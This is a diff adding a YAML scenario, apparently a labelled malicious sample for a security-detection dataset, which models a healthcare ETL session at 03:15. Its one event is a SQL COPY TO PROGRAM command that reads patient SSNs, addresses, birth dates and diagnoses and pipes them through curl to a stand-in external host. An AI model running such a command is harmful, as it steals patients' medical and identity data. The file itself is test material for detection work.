@@ -1,0 +1,30 @@
+scenario_id: healthcare_etl_exfil_mal_0001
+family_id: healthcare_etl_pair_0001
+domain: healthcare
+matched_pair_id: healthcare_etl_pair_0001
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - role
+  varied:
+  - sql_content
+  - connects_to_destination
+time_of_day: 03:15
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: replication
+  role: research_etl_service
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 2.3154269212026826
+  events:
+  - step_id: replicate
+    sql: COPY (SELECT p.ssn, p.address, p.date_of_birth, m.diagnosis_code, m.diagnosis_notes FROM patients p JOIN medical_records m ON m.patient_id = p.patient_id) TO PROGRAM 'curl -sX POST https://sync.example.net/push
+      -d @-'
+    connects_to:
+      ip: 185.220.101.5
+      port: 8443
